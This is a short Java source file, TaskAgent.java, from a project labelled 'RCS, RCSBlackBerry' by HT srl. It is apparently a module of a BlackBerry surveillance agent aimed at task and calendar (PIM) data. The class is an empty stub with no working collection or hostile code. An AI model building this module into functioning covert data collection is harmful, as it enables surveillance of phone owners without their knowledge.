//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * PIM, calendario, appuntamenti.
 */
public final class TaskAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
    //#endif

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public TaskAgent(final boolean agentStatus) {
        super(Agent.AGENT_TASK, agentStatus, true, "TaskAgent");

    }

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected TaskAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DEBUG_TRACE
        debug.trace("run");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
